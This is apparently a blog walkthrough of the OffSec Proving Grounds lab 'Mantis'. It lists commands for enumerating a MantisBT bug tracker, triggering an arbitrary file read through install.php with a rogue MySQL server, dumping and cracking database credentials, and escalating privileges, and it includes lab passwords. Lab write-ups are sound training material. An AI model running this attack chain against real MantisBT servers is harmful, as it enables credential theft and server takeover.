---
title: Mantis
date: 2026-06-16T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - python
  - Caido
  - ffuf
  - gobuster
  - wfuzz
  - sudo
  - pspy
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Mantis"
---
You're unstoppable as long as you keep taking the next step.
— Beverly K. Bachel

![](Screenshot%202026-06-07%20at%2014.13.39.png)

![](Screenshot%202026-06-07%20at%2014.14.16.png)![](Screenshot%202026-06-07%20at%2014.14.44.png)

`curl http://192.168.214.204/ | grep team-title | awk -F '[><]' '{print $3}' > users.txt`

![](Screenshot%202026-06-07%20at%2014.24.10.png)

Patric Green
Celina D Cruze
Daryl Dixon
Mark Parker


Needs a bigger wordlist...

![](Screenshot%202026-06-07%20at%2016.27.02.png)

 `ffuf -u http://192.168.242.204/bugtracker/FUZZ -w /usr/share/wordlists/dirb/common.txt -recursion`

![](Screenshot%202026-06-15%20at%2017.33.11.png)


There is a lot to sift through. I was pretty lost. 
 
![](Screenshot%202026-06-15%20at%2017.35.10.png)



![](Screenshot%202026-06-07%20at%2016.16.18.png)


![](Screenshot%202026-06-15%20at%2017.38.31.png)

If you look carefully though these files it'll lead you towards the arbitrary file read vulnerability. 
You'll use the exploit to read the PHP configuration file that will give you creds for the MYSQL database. To trigger the exploit curl the install.php file.

![](Screenshot%202026-06-15%20at%2017.37.42.png)

![](Screenshot%202026-06-15%20at%2017.39.54.png)

Google: mysql php bugtracker 

![](Screenshot%202026-06-15%20at%2017.41.56.png)

https://mantisbt.org/bugs/view.php?id=23173

`git clone https://github.com/allyshka/Rogue-MySql-Server.git`

![](Screenshot%202026-06-15%20at%2017.27.18.png)

Trigger:  
`curl 'http://192.168.242.204/bugtracker/admin/install.php?install=3&hostname=192.168.45.162'`

![](Screenshot%202026-06-15%20at%2017.43.35.png)

We now know the address:

![](Screenshot%202026-06-15%20at%2017.49.31.png)

![](Screenshot%202026-06-15%20at%2017.49.21.png)

![](Screenshot%202026-06-15%20at%2017.48.10.png)


`mysqldump -h 192.168.242.204 -u root -P 3306 -A -p'SuperSequelPassword' --skip-ssl`

Or:

`mysql --host=192.168.242.204 --port=3306 --user=root --password=SuperSequelPassword --skip-ssl`  

`SHOW DATABASES;`
![](Screenshot%202026-06-15%20at%2020.58.33.png)

USE bugtracker;  
SHOW TABLES;

![](Screenshot%202026-06-15%20at%2021.00.19.png)

SELECT * FROM mantis_user_table;

![](Screenshot%202026-06-15%20at%2021.00.40.png)

`hashcat -m 0  -a 0 root.txt /usr/share/wordlists/rockyou.txt.gz`

![](Screenshot%202026-06-15%20at%2020.57.03.png)

login to the web portal: administrator:prayingmantis

![](Screenshot%202026-06-15%20at%2021.15.05.png)

CVE-2019-15715  
https://mantisbt.org/bugs/view.php?id=26091

![](Screenshot%202026-06-15%20at%2021.47.34.png)

![](Screenshot%202026-06-15%20at%2021.46.31.png)

![](Screenshot%202026-06-15%20at%2021.46.48.png)

![](Screenshot%202026-06-15%20at%2021.46.11.png)

Pspy will sniff the command, download and move it onto the victim's machine. 

https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1

`https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64`
`chmod +x pspy64`
`./pspy64`

![](Screenshot%202026-06-16%20at%2009.55.15.png)

`su mantis`
`BugTracker007`

![](Screenshot%202026-06-17%20at%2009.13.23.png)

![](Screenshot%202026-06-17%20at%2009.44.14.png)

sudo -l

![](Screenshot%202026-06-17%20at%2017.12.17.png)
😈